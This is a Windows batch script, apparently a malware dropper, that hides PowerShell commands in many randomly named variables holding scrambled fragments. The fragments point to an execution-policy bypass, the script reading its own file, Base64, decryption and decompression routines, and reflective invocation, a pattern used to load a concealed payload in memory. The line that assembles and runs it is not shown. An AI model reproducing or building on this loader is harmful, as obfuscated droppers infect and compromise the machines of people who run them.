@echo off
set "dUPSGLzPRk=tryP"
set "WLgeYASyYl='[-1"
set "ccDsWLJcHB=oint"
set "FKHPxByysh=ose("
set "hLPDHYVDhF=ring"
set "YOerhfWlcY=le  "
set "VPfwPKvBio=);$Y"
set "uNSobdbPKc=[-1."
set "isjtOQEcQu=esaB"
set "dOmtZEJtsg=sion"
set "WVkHgJFyHq=ypto"
set "iWUiVMPohp=Disp"
set "VotgKgYpZV=F'[-"
set "nTNaZfDrUE=IZMC"
set "ynlBbypvSA=)($e"
set "dDrZRxEeDb=$eTu"
set "wmMPsFbWSP=lBlo"
set "MpZcamMVJC=oin "
set "oWHftgXHRP=em.I"
set "HfRhiiocfu=tem."
set "HyXqXIXhEh=vHGb"
set "SNffBabMFl=();$"
set "drMjSKHmrE=kyhK"
set "wQRTbeTzEm=hnpn"
set "KLUcQsyKqr=2VUN"
set "nnKCJbbBVM=DNJS"
set "peWUEHUFFr=$The"
set "ZgUKtNQcvW=ose("
set "bmYKdRZttP=comm"
set "lJqdNQXOPD=Mode"
set "BPFGGYbNZR=hUm."
set "BXkuyFlIKh=Gb.I"
set "AMKHINVAOp=$YLD"
set "sMNaYlBLGT=ress"
set "odNYACpOgB=ne);"
set "zECmrwtboe=m.Re"
set "WfOmzRwFbe=pose"
set "qTzYQAyKJL=daeR"
set "DNYfyLGwBy=Comp"
set "voAlDvYmkL=$bCA"
set "CtyEuVWNcN=Disp"
set "iUFKRJBQfL= = ["
set "ELHNdxSkne=[IO."
set "fyHJzKjdmg=ing("
set "lJGjdGMSGA=ddin"
set "VEDMwDaVxN=X) {"
set "IpzqJVGpUF=('%~f0'"
set "cIgzgcFhVa=Secu"
set "HoEDoUgHUv=qt);"
set "ujzcHCQKua=morF"
set "EaRcfhDBoZ= = $"
set "dVAlzyzfvR=;$Ru"
set "yIkpQgjimq= '')"
set "BEDSrfuYtw=form"
set "RxWQgmFyuE=nirt"
set "EHskOfHPZb=rofi"
set "uoSCRVVKIW=eTuw"
set "OgpRnpqeNp=vHGb"
set "mzAimKAqQn=qt ="
set "zsCGHROxXK=HO3I"
set "RziaOfVPND=stem"
set "HcVnoBbifX=tsWi"
set "zGBlbWVDjp=$YLD"
set "xMFMiQRpYw=ke($"
set "GSOYAfWRbQ=);$i"
set "fKolDPZKSh=tion"
set "xvSqtscENj=::('"
set "VgCTqxbfXV=-Obj"
set "pzlNCOjSxQ= [st"
set "GotJLLqUBT=$Ruv"
set "NAPzbyGbIW=gnir"
set "IhneKLPRoi=bypa"
set "JAhxrkbCwq=ment"
set "nQsSFlnljt=.-16"
set "pEHmlWfoBo=-1.."
set "TsDkRwfdqz==');"
set "wsCTAmsBHo=flec"
set "DMfAKkQIjO=.Mod"
set "kHzAgRLXla=bjec"
set "tpScsAYuPm=ss -"
set "plyqoweOPA=iron"
set "jGZsFFPdVW=grap"
set "tFSEITYdvE=vaC "
set "DChAFGSTtz=e]::"
set "YqtprxSfBZ=16] "
set "YYOtXWqefv=stem"
set "oKeZvEHOdP=3); "
set "XZrpJbdgNj=pres"
set "qbmwRWDRqw=rans"
set "jWtXjEVeOm=)($g"
set "XbzrYOmlYV=aC.T"
set "dxfEnERZkw=, $e"
set "LHNKFLaJwZ=ay()"
set "XzElREBsRt='[-1"
set "noBIlYdPVY=se()"
set "XsGqpECexA=tem."
set "RZsHyOZYHx=ewLi"
set "WWnkgwMTDY=mory"
set "MztDWIaWIo=  $g"
set "ojnBgBrlvH=VvHG"
set "YEJEhKWapU=('%*'"
set "zbkJbdvlZS=ct S"
set "xzVZBfjVfE= = N"
set "cwmyMDyxrt=[Env"
set "VuCGjGtUMz=IoO3"
set "ZyoWUtRCzk=lit("
set "WYkvuhiPPt=[Sys"
